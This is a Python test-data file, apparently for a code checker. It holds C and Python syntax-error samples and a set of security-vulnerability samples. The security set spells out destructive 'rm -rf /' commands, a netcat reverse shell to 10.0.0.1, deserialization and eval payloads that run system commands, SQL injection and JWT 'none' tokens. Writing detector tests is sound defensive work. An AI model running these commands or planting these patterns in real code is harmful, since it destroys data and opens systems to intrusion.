# --- SYNTAX & SEMANTIC ERRORS (C & Python) ---
SYNTAX_TESTS = {
    "Custom User Input": "",
    "C: Missing Semicolon (Basic)": "int main() {\n    printf(\"Hello\")\n    return 0;\n}",
    "C: Missing Closing Brace": "int main() {\n    int x = 5;\n    return 0;",
    "C: Unmatched Brackets": "int main() {\n    int arr[10);\n    return 0;\n}",
    "C: Missing Parenthesis in Printf": "int main() {\n    printf\"Hello World\");\n    return 0;\n}",
    "C: Misspelled Main Function": "int mian() {\n    return 0;\n}",
    "C: Invalid Assignment (==)": "int main() {\n    int a == 12;\n    return 0;\n}",
    "C: Float assigned to Int": "int main() {\n    int a = 12.5;\n    return 0;\n}",
    "C: Undeclared Bool used": "int main() {\n    bool flag = 1;\n    return 0;\n}",
    "C: Variable Redefinition": "int main() {\n    int x = 5;\n    float x = 10.0;\n    return 0;\n}",
    "C: Missing Return Type": "main() {\n    return 0;\n}",
    "C: Invalid Keyword Prefix": "int main() {\n    get int val = 5;\n    return 0;\n}",
    "C: Missing include for printf": "int main() {\n    printf(\"Hello\");\n    return 0;\n}",
    "C: For loop syntax error": "int main() {\n    for(int i=0 i<10; i++) {}\n    return 0;\n}",
    "C: If condition assignment": "int main() {\n    int x = 5;\n    if(x = 10) {\n        x++;\n    }\n    return 0;\n}",
    "C: Unclosed String Literal": "int main() {\n    printf(\"Hello);\n    return 0;\n}",
    "Py: Missing Colon in If": "if True\n    print('Yes')",
    "Py: Missing Colon in Def": "def test()\n    pass",
    "Py: Missing Colon in For": "for i in range(10)\n    print(i)",
    "Py: Missing Colon in While": "while True\n    break",
    "Py: Missing Print Parenthesis": "print 'Hello World'",
    "Py: Indentation Error": "def func():\nprint('Hello')",
    "Py: Unmatched Parentheses": "x = (5 + 3",
    "Py: Missing String Quotes": "print(Hello World)",
    "Py: Reserved Keyword Used": "def = 5",
    "Py: Invalid Variable Name": "1var = 10",
    "Py: Assignment Operator Typo": "x == 5",
}

# Add more variations to syntax tests to reach ~40
for i in range(1, 15):
    SYNTAX_TESTS[f"C: Random Syntax Variation {i}"] = f"int main() {{\n    int var{i} = {i}\n    return 0;\n}}"

# --- SECURITY VULNERABILITIES ---
SECURITY_TESTS = {
    "Custom User Input": "",
    "Py: OS Command Injection (rm)": "import os\nos.system('rm -rf /')",
    "Py: Subprocess Injection": "import subprocess\nsubprocess.call(['rm', '-rf', '/'])",
    "Py: Popen Reverse Shell": "import os\nos.popen('nc -e /bin/sh 10.0.0.1 1234')",
    "Py: Eval Execution": "eval('__import__(\"os\").system(\"cmd\")')",
    "Py: Exec Execution": "exec('import os; os.system(\"calc\")')",
    "Py: Weak Crypto (MD5)": "import hashlib\nhashlib.md5(b'password')",
    "Py: Weak Crypto (SHA1)": "import hashlib\nh = hashlib.sha1()\nh.update(b'password')",
    "Py: Destructive File Op (Wildcard)": "import os\nos.system('rm -rf *')",
    "Py: Unsafe File Permissions": "import os\nos.system('chmod 777 data.txt')",
    "C: System Call (RM)": "#include <stdlib.h>\nint main() {\n    system(\"rm -rf /\");\n    return 0;\n}",
    "C: Buffer Overflow (gets)": "#include <stdio.h>\nint main() {\n    char buffer[10];\n    gets(buffer);\n    return 0;\n}",
    "C: Format String Vuln": "#include <stdio.h>\nint main() {\n    char *str = \"%x %x\";\n    printf(str);\n    return 0;\n}",
    "Py: YAML Deserialization": "import yaml\nyaml.load('- !!python/object/new:os.system [\"calc\"]')",
    "Py: Pickle Deserialization": "import pickle\npickle.loads(b'cos\\nsystem\\n(S\"cmd\"\\ntR.')",
    "Py: SQL Injection (String Formatting)": "query = f\"SELECT * FROM users WHERE name = '{user_input}'\"",
    "Py: SQL Injection (Concatenation)": "query = \"SELECT * FROM users WHERE name = \" + user_input",
    "Py: Hardcoded Credentials": "password = 'admin123'\nusername = 'root'",
    "Py: Assert used in Prod": "assert user_is_admin, 'Access Denied'",
    "Py: JWT None Algorithm": "import jwt\ntoken = jwt.encode({'user': 'admin'}, key='', algorithm='none')",
    "Py: Flask Debug True": "from flask import Flask\napp = Flask(__name__)\napp.run(debug=True)",
}

# Add more variations to security tests to reach ~40
for i in range(1, 21):
    SECURITY_TESTS[f"Py: Malicious payload variant {i}"] = f"import os\nos.system('malware_trigger_{i}.sh')"
